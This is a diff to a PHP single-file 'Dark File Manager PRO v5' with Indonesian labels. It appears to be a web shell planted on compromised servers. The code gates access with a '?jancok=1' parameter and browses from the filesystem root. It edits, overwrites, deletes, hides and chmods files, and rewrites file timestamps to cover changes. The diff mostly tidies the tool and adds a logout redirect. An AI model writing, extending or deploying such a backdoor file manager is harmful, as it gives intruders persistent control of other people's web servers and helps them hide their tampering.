@@ -12,6 +12,12 @@ $dir = realpath($dir) ? realpath($dir) : realpath('.');
 $msg = '';
 $msg_type = 'info';
 
+// Logout Handler
+if (isset($_GET['logout'])) {
+    header('Location: ?jancok=0');
+    exit;
+}
+
 // Download File
 if (isset($_GET['download'])) {
     $file_download = $dir . DIRECTORY_SEPARATOR . basename($_GET['download']);
@@ -72,22 +78,18 @@ if (isset($_POST['new_file']) && !empty($_POST['new_file'])) {
     } else { $msg = "File sudah ada."; $msg_type = 'error'; }
 }
 
-// Rename (Dengan Fitur Timpa / Overwrite jika file sudah ada)
+// Rename
 if (isset($_POST['old_name']) && isset($_POST['new_name'])) {
     $old_p = $dir . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
     $new_p = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
     
     if (file_exists($old_p)) {
         if (file_exists($new_p)) {
-            if (is_file($new_p)) {
-                @unlink($new_p);
-            } elseif (is_dir($new_p)) {
-                @rmdir($new_p);
-            }
+            if (is_file($new_p)) { @unlink($new_p); }
+            elseif (is_dir($new_p)) { @rmdir($new_p); }
         }
-        
         if (rename($old_p, $new_p)) {
-            $msg = "Nama berhasil diubah dan ditimpa."; $msg_type = 'success';
+            $msg = "Nama berhasil diubah."; $msg_type = 'success';
         } else { 
             $msg = "Gagal mengubah nama."; $msg_type = 'error'; 
         }
@@ -105,7 +107,7 @@ if (isset($_GET['delete'])) {
 
 // Simpan Edit File
 if (isset($_POST['save_file_content']) && isset($_POST['edit_file_name'])) {
-    $file_target = $dir . DIRECTORY_SEPARATOR . $_POST['edit_file_name'];
+    $file_target = $dir . DIRECTORY_SEPARATOR . basename($_POST['edit_file_name']);
     if (is_file($file_target)) {
         file_put_contents($file_target, $_POST['save_file_content']);
         $msg = "Perubahan file disimpan."; $msg_type = 'success';
@@ -152,7 +154,7 @@ if (isset($_POST['hide_file_name'])) {
     }
 }
 
-// Mass Action (Aksi Banyak Sekaligus via Checkbox)
+// Mass Action
 if (isset($_POST['selected_items']) && isset($_POST['batch_action'])) {
     $items = $_POST['selected_items'];
     $action = $_POST['batch_action'];
@@ -251,6 +253,7 @@ sort($files);
         .alert-success { background: rgba(74, 222, 128, 0.15); color: var(--accent-green); border: 1px solid rgba(74, 222, 128, 0.3); }
         .alert-error { background: rgba(248, 113, 113, 0.15); color: var(--accent-red); border: 1px solid rgba(248, 113, 113, 0.3); }
         textarea { width: 100%; height: 450px; font-family: 'Fira Code', Consolas, monospace; background: #0f172a; color: #f8fafc; padding: 15px; border: 1px solid var(--border-color); border-radius: 6px; }
+        .neon-title { margin: 0; font-size: 22px; font-weight: 800; background: linear-gradient(270deg, #38bdf8, #818cf8, #c084fc, #38bdf8); background-size: 400% 400%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .action-select { padding: 5px 8px; background: #0f172a; color: #38bdf8; border: 1px solid var(--border-color); border-radius: 4px; font-size: 12px; cursor: pointer; }
 
         .neon-title {
@@ -284,19 +287,19 @@ sort($files);
 <div class="container">
     <div class="top-bar">
         <h2 class="neon-title">⚡ Dark File Manager <span class="pro-badge">PRO v5</span></h2>
-        <a href="?jancok=1&logout=1" class="btn btn-red">Keluar (Logout)</a>
+        <a href="?logout=1" class="btn btn-red">Keluar (Logout)</a>
     </div>
 
     <div class="breadcrumb">
-        <a href="?jancok=1&dir=<?= urlencode($base_dir) ?>" class="btn" style="background:#0284c7; margin-right:10px; padding:4px 8px; font-size:11px;">🏠 Home</a>
+        <a href="?dir=<?= urlencode($base_dir) ?>" class="btn" style="background:#0284c7; margin-right:10px; padding:4px 8px; font-size:11px;">🏠 Home</a>
         <strong>Direktori: </strong>
         <?php
         $path_parts = explode(DIRECTORY_SEPARATOR, $dir);
         $accumulator = '';
         foreach ($path_parts as $index => $part) {
-            if ($part === '') { $accumulator = '/'; echo '<a href="?jancok=1&dir=%2F">root</a>/'; continue; }
+            if ($part === '') { $accumulator = '/'; echo '<a href="?dir=%2F">root</a>/'; continue; }
             $accumulator .= ($accumulator === '/') ? $part : DIRECTORY_SEPARATOR . $part;
-            echo '<a href="?jancok=1&dir=' . urlencode($accumulator) . '">' . htmlspecialchars($part) . '</a>/';
+            echo '<a href="?dir=' . urlencode($accumulator) . '">' . htmlspecialchars($part) . '</a>/';
         }
         ?>
     </div>
@@ -305,6 +308,7 @@ sort($files);
         <div class="alert alert-<?= $msg_type ?>"><?= htmlspecialchars($msg) ?></div>
     <?php endif; ?>
 
+
     <!-- INTERFACE EDIT FILE -->
     <?php if (isset($_GET['edit'])): 
         $filename_edit = basename($_GET['edit']);
@@ -312,15 +316,8 @@ sort($files);
         $file_content = @file_get_contents($target_edit);
     ?>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.6/ace.js" type="text/javascript" charset="utf-8"></script>
-        
         <style>
-            #ace-editor {
-                width: 100%;
-                height: 500px;
-                border-radius: 8px;
-                border: 1px solid var(--border-color);
-                font-size: 14px;
-            }
+            #ace-editor { width: 100%; height: 500px; border-radius: 8px; border: 1px solid var(--border-color); font-size: 14px; }
         </style>
 
         <h4 style="color: #38bdf8;">Editing File: <?= htmlspecialchars($filename_edit) ?></h4>
@@ -337,18 +334,10 @@ sort($files);
             var editor = ace.edit("ace-editor");
             editor.setTheme("ace/theme/dracula");
             editor.session.setMode("ace/mode/php");
-            editor.setOptions({
-                fontSize: "10pt",
-                showPrintMargin: false,
-                highlightActiveLine: true,
-                enableBasicAutocompletion: true,
-                enableLiveAutocompletion: true
-            });
-
+            editor.setOptions({ fontSize: "10pt", showPrintMargin: false, highlightActiveLine: true });
             var form = document.getElementById('edit-form');
             form.onsubmit = function() {
-                var code = editor.getValue();
-                document.getElementById('real-textarea').value = code;
+                document.getElementById('real-textarea').value = editor.getValue();
             };
         </script>
     <?php exit; endif; ?>
@@ -378,7 +367,7 @@ sort($files);
         <form method="GET" action="" style="display: flex; gap: 8px; width: 100%; margin: 0;">
             <input type="hidden" name="jancok" value="1">
             <input type="hidden" name="dir" value="<?= htmlspecialchars($dir) ?>">
-            <input type="text" name="search" placeholder="Cari global (.php, index, dll)..." value="<?= htmlspecialchars(isset($_GET['search']) ? $_GET['search'] : '') ?>" style="flex-grow: 1;">
+            <input type="text" name="search" placeholder="Cari global..." value="<?= htmlspecialchars(isset($_GET['search']) ? $_GET['search'] : '') ?>" style="flex-grow: 1;">
             <button type="submit" class="btn btn-blue">Cari</button>
             <?php if (!empty($_GET['search'])): ?>
                 <a href="?jancok=1&dir=<?= urlencode($dir) ?>" class="btn btn-gray">Reset</a>
@@ -410,7 +399,7 @@ sort($files);
                 <option value="touch">Ubah Tanggal Terpilih</option>
             </select>
             <input type="datetime-local" name="batch_date" id="batch-date-input" style="display:none;">
-            <button type="submit" class="btn btn-blue" style="padding: 5px 12px; font-size: 12px;" onclick="return confirm('Jalankan aksi massal pada item terpilih?')">Eksekusi</button>
+            <button type="submit" class="btn btn-blue" style="padding: 5px 12px; font-size: 12px;" onclick="return confirm('Jalankan aksi massal?')">Eksekusi</button>
         </div>
 
         <table>
@@ -450,7 +439,7 @@ sort($files);
                         <span style="font-size: 10px; padding: 2px 6px; border-radius: 4px; background: <?= $badge_color ?>20; color: <?= $badge_color ?>; margin-left: 6px; font-weight: 600;"><?= $is_writable ? 'Writable' : 'Locked' ?></span>
                     </td>
                     <td style="text-align: right;">
-                        <select class="action-select" onchange="handleAction(this, '<?= htmlspecialchars($folder_path, ENT_QUOTES) ?>', '<?= htmlspecialchars($folder, ENT_QUOTES) ?>', '<?= $mtime ?>', '<?= $perms ?>')">
+                        <select class="action-select" onchange="handleAction(this, '<?= htmlspecialchars($folder_path, ENT_QUOTES) ?>', '<?= htmlspecialchars($folder, ENT_QUOTES) ?>', '<?= $mtime ?>', '<?= $perms ?>', false)">
                             <option value="">-- Aksi --</option>
                             <option value="date">Ubah Tanggal</option>
                             <option value="chmod">Ubah CHMOD</option>
@@ -499,6 +488,7 @@ sort($files);
     </form>
 </div>
 
+<!-- FORM TERSEMBUNYI UNTUK AKSI EKSEKUSI -->
 <form id="rename-form" method="POST" action="?jancok=1&dir=<?= urlencode($dir) ?>" style="display:none;">
     <input type="hidden" name="old_name" id="old_name">
     <input type="hidden" name="new_name" id="new_name">
@@ -531,8 +521,8 @@ document.getElementById('batch-action-select').addEventListener('change', functi
 });
 
 function toggleAll(source) {
-    checkboxes = document.getElementsByName('selected_items[]');
-    for(var i=0, n=checkboxes.length; n>i; i++) {
+    var checkboxes = document.getElementsByName('selected_items[]');
+    for(var i=0; i<checkboxes.length; i++) {
         checkboxes[i].checked = source.checked;
     }
 }
@@ -570,7 +560,6 @@ function handleAction(selectObj, targetPath, fileName, currentMtime, currentPerm
         if (newName && newName !== fileName) {
             document.getElementById('old_name').value = fileName;
             document.getElementById('new_name').value = newName;
-            document.getElementById('rename-form')->submit(); // wait, standard js submit:
             document.getElementById('rename-form').submit();
         }
     } else if (action === 'delete') {
